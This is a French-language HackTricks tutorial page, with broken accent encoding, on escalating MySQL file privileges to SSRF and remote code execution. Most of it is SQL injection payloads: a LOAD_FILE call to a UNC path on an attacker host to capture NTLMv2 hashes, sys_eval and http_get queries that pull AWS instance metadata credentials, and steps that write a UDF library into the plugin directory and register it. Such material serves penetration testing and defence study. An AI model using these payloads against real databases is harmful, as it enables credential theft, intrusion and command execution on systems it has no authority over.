# MySQL File priv √† SSRF/RCE

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PRs aux repos github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### LOAD\_FILE/LOAD DATA/LOAD XML √† SSRF

Chaque article sur l'exfiltration de donn√©es Out of Band SQL utilisera la fonction de cha√Æne `LOAD_FILE()` pour effectuer une requ√™te r√©seau. La fonction elle-m√™me a ses propres limitations bas√©es sur le syst√®me d'exploitation sur lequel elle est ex√©cut√©e et les param√®tres avec lesquels la base de donn√©es a √©t√© d√©marr√©e.

Par exemple, si la variable globale `secure_file_priv` n'√©tait pas d√©finie, [la valeur par d√©faut est d√©finie sur `/var/lib/mysql-files/`](https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html), ce qui signifie que vous ne pouvez utiliser des fonctions comme `LOAD_FILE('nomdefichier')` ou `LOAD DATA [LOCAL] INFILE 'nomdefichier' INTO TABLE nomdetable` que pour lire des fichiers du r√©pertoire `/var/lib/mysql-files/`. Pour pouvoir effectuer des lectures sur des fichiers en dehors de ce r√©pertoire, l'option `secure_file_priv` doit √™tre d√©finie sur `""`, ce qui ne peut √™tre fait qu'en mettant √† jour le fichier de configuration de la base de donn√©es ou en passant le param√®tre de d√©marrage `--secure_file_priv=""` au service de base de donn√©es.

N√©anmoins, dans les circonstances o√π `secure_file_priv` est d√©fini sur `""`, nous devrions √™tre capables de lire d'autres fichiers sur le syst√®me, en supposant que les permissions de lecture de fichiers et `file_priv` sont d√©finis sur `Y` dans `mysql.user` pour l'utilisateur de la base de donn√©es actuelle. Cependant, la possibilit√© d'utiliser ces fonctions pour effectuer des appels r√©seau d√©pend beaucoup du syst√®me d'exploitation. Comme ces fonctions sont con√ßues uniquement pour lire des fichiers, les seuls appels r√©seau pertinents qui peuvent √™tre effectu√©s sont vers des chemins UNC sur des h√¥tes Windows, car [l'API Windows `CreateFileA` qui est appel√©e lors de l'acc√®s √† un fichier comprend les conventions de nommage UNC](https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file).

Donc, si votre base de donn√©es cible fonctionne sur une machine Windows, la requ√™te d'injection `x'; SELECT LOAD_FILE('\\\\attackerserver.example.com\\a.txt'); -- //` [r√©sulterait en la machine Windows envoyant des hachages NTLMv2 dans une tentative d'authentification avec le serveur contr√¥l√© par l'attaquant `\\attackerserver.example.com`](https://packetstormsecurity.com/files/140832/MySQL-OOB-Hacking.html).

Cette falsification de requ√™te c√¥t√© serveur, bien qu'utile, est limit√©e au seul port TCP 445. Vous ne pouvez pas contr√¥ler le num√©ro de port, mais pouvez lire des informations √† partir de partages configur√©s avec des privil√®ges de lecture complets. De plus, comme cela a √©t√© d√©montr√© avec des recherches plus anciennes, vous pouvez utiliser cette capacit√© limit√©e de SSRF pour voler des hachages et les relayer pour obtenir des shells, donc c'est d√©finitivement utile.

### Fonctions D√©finies par l'Utilisateur pour RCE

Une autre technique int√©ressante avec les bases de donn√©es MySQL est la capacit√© d'utiliser des Fonctions D√©finies par l'Utilisateur (UDF) pr√©sentes dans des fichiers de biblioth√®ques externes qui, si pr√©sents dans des emplacements sp√©cifiques ou dans le $PATH du syst√®me, peuvent alors √™tre accessibles depuis MySQL.

Vous pourriez utiliser une Injection SQL pour **√©crire une biblioth√®que (`.so` ou `.dll`** selon que vous √™tes sur Linux ou Windows), contenant une Fonction D√©finie par l'Utilisateur qui peut effectuer des requ√™tes r√©seau/HTTP, qui peut ensuite √™tre invoqu√©e par des requ√™tes suppl√©mentaires.

Cela a son propre ensemble de restrictions cependant. Selon la version de MySQL, que vous pouvez identifier avec `select @@version`, le r√©pertoire d'o√π les plugins peuvent √™tre charg√©s est restreint. MySQL en dessous de `v5.0.67` permettait de charger des fichiers de biblioth√®que √† partir du chemin syst√®me si la variable `plugin_dir` n'√©tait pas d√©finie. Cela a chang√© maintenant et les versions plus r√©centes ont la variable **`plugin_dir`** d√©finie sur quelque chose comme `/usr/lib/mysql/plugin/`, qui est g√©n√©ralement poss√©d√© par root.

En gros **pour que vous puissiez charger une biblioth√®que personnalis√©e dans MySQL et appeler une fonction de la biblioth√®que charg√©e via Injection SQL, vous auriez besoin** :

* de la capacit√© √† **√©crire √† l'emplacement** sp√©cifi√© dans **`@@plugin_dir`** via Injection SQL
* **`file_priv`** d√©fini sur **`Y`** dans `mysql.user` pour l'utilisateur de la base de donn√©es actuelle
* **`secure_file_priv`** d√©fini sur **`""`** afin que vous puissiez lire les octets bruts de la biblioth√®que √† partir d'un emplacement arbitraire comme le r√©seau ou un r√©pertoire de t√©l√©chargements de fichiers dans une application web.

En supposant que les conditions ci-dessus soient remplies, vous pouvez utiliser **l'approche classique de transf√©rer la** [**biblioth√®que UDF MySQL populaire `lib_mysqludf_sys`**](https://github.com/mysqludf/lib\_mysqludf\_sys) **au serveur de base de donn√©es**. Vous pourriez alors √™tre capable de faire des requ√™tes de commandes du syst√®me d'exploitation comme `cURL` ou `powershell wget` pour effectuer du SSRF en utilisant la syntaxe

`x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

Il y a beaucoup d'autres fonctions d√©clar√©es dans cette biblioth√®que, une analyse de celles-ci peut √™tre vue [ici](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/). Si vous √™tes paresseux comme moi, vous pouvez obtenir une copie de cette biblioth√®que UDF, pour le syst√®me d'exploitation cible, √† partir d'une installation metasploit depuis le r√©pertoire `/usr/share/metasploit-framework/data/exploits/mysql/` et commencer.

Alternativement, des biblioth√®ques UDF ont √©t√© cr√©√©es pour fournir sp√©cifiquement √† la base de donn√©es la capacit√© de faire des requ√™tes HTTP. Vous pouvez utiliser [MySQL User-defined function (UDF) pour HTTP GET/POST](https://github.com/y-ken/mysql-udf-http) pour que la base de donn√©es effectue des requ√™tes HTTP, en utilisant la syntaxe suivante

`x'; SELECT http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

Vous pourriez √©galement [cr√©er votre propre UDF et l'utiliser pour l'exploitation post√©rieure √©galement.](https://pure.security/simple-mysql-backdoor-using-user-defined-functions/)

Dans tous les cas, vous devez transf√©rer la biblioth√®que au serveur de base de donn√©es. Vous pouvez le faire de plusieurs mani√®res

1. Utilisez la fonction de cha√Æne MySQL `hex()` ou quelque chose comme `xxd -p filename.so | tr -d '\n'` pour convertir le contenu de la biblioth√®que en format hexad√©cimal, puis le d√©verser dans le r√©pertoire `@@plugin_dir` en utilisant `x'; SELECT unhex(0x1234abcd12abcdef1223.....) into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`
2. Alternativement, convertissez le contenu de `filename.so` en base64 et utilisez `x';select from_base64("AAAABB....") into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`

Si le `@@plugin_dir` n'est pas inscriptible, alors vous n'avez pas de chance si la version est sup√©rieure √† `v5.0.67`. Sinon, √©crivez √† un emplacement diff√©rent qui est dans le chemin et chargez la biblioth√®que UDF √† partir de l√† en utilisant

* pour la biblioth√®que `lib_mysqludf_sys` - `x';create function sys_eval returns string soname 'lib_mysqludf_sys.so'; -- //`
* pour la biblioth√®que `mysql-udf-http` - `x';create function http_get returns string soname 'mysql-udf-http.so'; -- //`


Pour automatiser cela, vous pouvez utiliser SQLMap qui prend en charge [l'utilisation de UDF personnalis√©s via l'option `--udf-inject`](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

Pour les Injections SQL Aveugles, vous pourriez rediriger la sortie des fonctions UDF vers une table temporaire, puis lire les donn√©es de l√† ou utiliser [une requ√™te DNS introduite dans une commande `sys_eval` ou `sys_exec` curl](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration).

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PRs aux repos github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
